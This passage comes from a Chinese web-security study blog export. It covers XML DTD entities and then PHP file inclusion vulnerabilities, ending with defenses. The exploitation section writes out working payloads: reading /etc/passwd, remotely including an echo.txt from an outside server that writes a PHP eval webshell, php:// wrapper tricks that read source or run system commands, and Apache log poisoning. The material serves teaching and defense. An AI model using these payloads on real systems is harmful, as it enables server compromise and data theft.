class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="DTD实体"><a href="#DTD实体" class="headerlink" title="DTD实体"></a>DTD实体</h2><ul><li>参数实体只能在DTD中使用</li><li>参数实体可嵌套定义，但内层定义的参数实体<code>%</code>需要<strong>HTML转义</strong>。</li></ul><table><thead><tr><th></th><th>一般实体声明：</th><th>引用：</th><th>参数实体声明：</th><th>引用：</th></tr></thead><tbody><tr><td>内部实体</td><td><code>&lt;!ENTITY 实体名 实体的值 &gt;</code></td><td>&amp;实体名</td><td><code>&lt;!ENTITY %实体名 &quot;实体的值&quot;&gt; </code></td><td>%实体名；</td></tr><tr><td>外部实体</td><td><code>&lt;!ENTITY 实体名 SYSTEM  url &gt;</code></td><td>&amp;实体名</td><td><code>&lt;!ENTITY %实体名 SYSTEM url&gt; </code></td><td>%实体名；</td></tr></tbody></table><p><strong>实例：</strong></p><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [    &lt;!ENTITY normal    &quot;hello&quot;&gt;     &lt;!-- 内部一般实体 --&gt;    &lt;!ENTITY % normal2 &quot;hello&quot;&gt;     &lt;!-- 内部参数实体 --&gt;    &lt;!ENTITY normal3 SYSTEM &quot;http:&#x2F;&#x2F;xml.org&#x2F;hhh.dtd&quot;&gt;    &lt;!-- 外部一般实体 --&gt;    &lt;!ENTITY % normal4 SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;1234.dtd&quot;&gt;        &lt;!-- 外部参数实体 --&gt;    %normal4;            &lt;!-- 引用参数实体 --&gt;]&gt;&lt;message&gt;&amp;normal;&lt;&#x2F;message&gt;    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="为什么使用DTD"><a href="#为什么使用DTD" class="headerlink" title="为什么使用DTD"></a>为什么使用DTD</h2><ul><li>通过 DTD，每一个 XML 文件均可携带一个有关其<strong>自身格式</strong>的描述。</li><li>独立的团体可一致地使用某个标准的 DTD 来<strong>交换数据。</strong></li><li>应用程序也可使用某个标准的 DTD 来<strong>验证从外部接收到的数据</strong>。</li><li>还可以使用 DTD 来<strong>验证您自身的数据</strong>。</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> web安全基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件包含漏洞</title>
      <link href="/2022/01/15/wen-jian-bao-han/"/>
      <url>/2022/01/15/wen-jian-bao-han/</url>
      
        <content type="html"><![CDATA[<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>​    大多数web语言（php、java等）可以提供文件包含的操作，以php为例：服务器执行php文件时，可以通过文件包含函数加载另一个文件中的php代码，并且当php来执行。<!--注：其他语言也可能出现包含漏洞--></p><h2 id="文件包含函数-PHP"><a href="#文件包含函数-PHP" class="headerlink" title="文件包含函数-PHP"></a>文件包含函数-PHP</h2><table><thead><tr><th>php函数：</th><th>解析：</th></tr></thead><tbody><tr><td>Include</td><td>执行到include时才包含文件，找不到被包含文件时产生警告，脚本继续执行</td></tr><tr><td>Include_once</td><td>与Include()语句类似，区别是若文件已被包涵则不会再次包含。</td></tr><tr><td>Require</td><td>程序一运行就包含文件，找不到被包含的文件时产生致命错误，并停止脚本</td></tr><tr><td>Require_once</td><td>与Require()语句类似，区别是若文件已被包涵则不会再次包含。</td></tr></tbody></table><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><h3 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h3><h4 id="漏洞示例：（无限制）"><a href="#漏洞示例：（无限制）" class="headerlink" title="漏洞示例：（无限制）"></a>漏洞示例：（无限制）</h4><p>在index.php中有如下代码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$filename</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>​    在提交url时，当在url中取得filename参数的值时，include直接包含了这个文件。如：</p><p><code>http://www.xxx.com/index.php?filname=xxx.php</code></p><p>​    若xxx.php为已存在敏感文件，则会造成一些敏感信息泄露的问题。若xxx.php文件为用户可控（结合文件上传），则会造成严重危害。若xxx.php文件不存在，通常会产生报错信息，从而可能会泄露网站的绝对路径，造成安全隐患。</p><h4 id="漏洞示例：（有限制）"><a href="#漏洞示例：（有限制）" class="headerlink" title="漏洞示例：（有限制）"></a>漏洞示例：（有限制）</h4><p>核心代码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$filename</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token operator">.</span><span class="token string double-quoted-string">".html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>与上述漏洞不同的是，服务端将所包含文件加后缀<code>.html</code>强制转换成html类型去执行。</p><p>绕过方法：</p><p>​    windows文件命名不超过256个字符，可使用<code>./</code>进行垃圾字符填充，使.html没有空间写入文件名中。</p><p>长度截断：windows,点号长于256，linux长于4096</p><h3 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h3><p>​    在php语言中，若使用远程文件包含，首先确定php是否开启远程文件包含功能：allow_url_include = On</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">allow_url_fopen <span class="token operator">=</span> <span class="token function">On</span> <span class="token punctuation">(</span>允许打开<span class="token constant">URL</span>文件<span class="token punctuation">)</span><span class="token comment">//默认开启</span>allow_url_fopen <span class="token operator">=</span> <span class="token function">Off</span> <span class="token punctuation">(</span>禁止打开<span class="token constant">URL</span>文件<span class="token punctuation">)</span>allow_url_include <span class="token operator">=</span> <span class="token function">Off</span> <span class="token punctuation">(</span>禁止引用<span class="token constant">URL</span>文件<span class="token punctuation">)</span><span class="token comment">//php 5.2以后添加,安全方便的设置(默认关闭)</span>allow_url_include <span class="token operator">=</span> <span class="token function">On</span> <span class="token punctuation">(</span>允许引用<span class="token constant">URL</span>文件<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="利用："><a href="#利用：" class="headerlink" title="利用："></a>利用：</h2><p><strong>前提：</strong></p><ol><li>Web应用采用include()等文件包含函数通过动态变量的方式引入需要包含的文件;</li><li>用户能够控制该动态变量。</li></ol><h3 id="1、读取敏感文件"><a href="#1、读取敏感文件" class="headerlink" title="1、读取敏感文件"></a>1、读取敏感文件</h3><p><code>http://www.xxx.com/index.php?filname=/etc/passwd</code><!--目标主机文件存在，且有相应权限--></p><h3 id="2、远程包含shell"><a href="#2、远程包含shell" class="headerlink" title="2、远程包含shell"></a>2、远程包含shell</h3><p>若<code>allow_url_fopen=on</code>，可尝试远程包含一句话木马。</p><p>示例：</p><p>个人服务器地址:<strong><a href="http://twowards.top/">http://twowards.top</a></strong></p><p>在网站根目录准备<strong>echo.txt</strong>文件代码如下：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>fputs(fopen("shell.php","w"),"<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>cmd<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>")</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><!--代码解析：--><!--fputs(要写入的打开文件,写入的字符串内容)--><!--fopen(规定要打开的文件，访问此文件的类型，此处为写入w)--><p>访问<code>http://www.xxx.com/index.php?filname=http://twowards.top/echo.txt</code>，将会在index.php所在目录生成木马文件shell.php<code>&lt;?php eval($_POST[cmd]);?&gt;</code></p><h3 id="3、本地包含配合文件上传"><a href="#3、本地包含配合文件上传" class="headerlink" title="3、本地包含配合文件上传"></a>3、本地包含配合文件上传</h3><p>若网站提供文件上传功能，通过文件上传上传木马到服务器后使用本地文件包含进行利用。</p><!--直接利用文件上传访问木马可能会无法解析，所以要配合文件包含漏洞。--><h3 id="4、php伪协议"><a href="#4、php伪协议" class="headerlink" title="4、php伪协议"></a>4、php伪协议</h3><p>以参数为filename示例：</p><table><thead><tr><th>协议</th><th>用法</th><th>含义</th></tr></thead><tbody><tr><td>file://</td><td>?filename=file://绝对路径</td><td>访问本地文件系统</td></tr><tr><td>php://filter</td><td>?filename=filter/read=convert.base64-encode/resource=xxx.php</td><td>读取源码（此处读取到base64加密后的源码）</td></tr><tr><td>php://input</td><td>?filename=php://input【POST DATA】<?php phpinfo()?></td><td>执行php代码。前提：allow_url_include=on</td></tr></tbody></table><p>补充：php://input 用post提交php代码时，可提交<code>&lt;?php system(&#39;xxx&#39;)?&gt;</code>来执行系统命令。如：<code>&lt;?php system(&#39;net user&#39;)?&gt;</code>查看用户</p><h3 id="5、包含apache日志文件"><a href="#5、包含apache日志文件" class="headerlink" title="5、包含apache日志文件"></a>5、包含apache日志文件</h3><p>当php文件存在本地包含漏洞时，却无法上传文件时，导致无法深度利用。Apache日志文件也是另一种思路。</p><p>前提：可找到Apache日志路径</p><p>原理：</p><p>Apache运行后通常默认生成两个日志文件access.log（访问日志），error.log（错误日志）。access.log记录了客户端每次请求服务器响应的相关信息。当访问资源不存在时，同样也会记录。</p><p>示例：</p><p>当请求：<code>http://www.xxx.com/&lt;?php phpinfo();?&gt;</code>时，Apache会记录<code>&lt;?php phpinfo?&gt;</code>，并写入access.log。</p><p>然而到此处并不能直接包含此日志文件：一句话木马在日志里发生了变形。如下：</p><p><code>127.0.0.1 - - [19/Nov/2021:15:00:00 +0800] &quot;GET /%3C?php%20phpinfo();%3E&quot;</code></p><p>可以看到php中的<code>&lt; &gt;空格</code>被浏览器进行了转码。</p><p>此时攻击者可利用BurpSuite来绕过编码，之后使用包含漏洞来包含access.log，去执行其中php代码。</p><p>补充：安全起见，Apache安装时尽量不要使用默认路径。</p><h2 id="防御："><a href="#防御：" class="headerlink" title="防御："></a>防御：</h2><p>1、严格控制包含中参数是否外部可控。</p><p>2、路径限制：限制被包含文件只能在某一文件夹内，禁止目录跳转字符。如<code>./</code>。</p><p>3、包含验证：被包含文件是否在白名单中。</p><p>4、尽量不使用动态包含，固定包含文件如：include(“head.php”);。</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
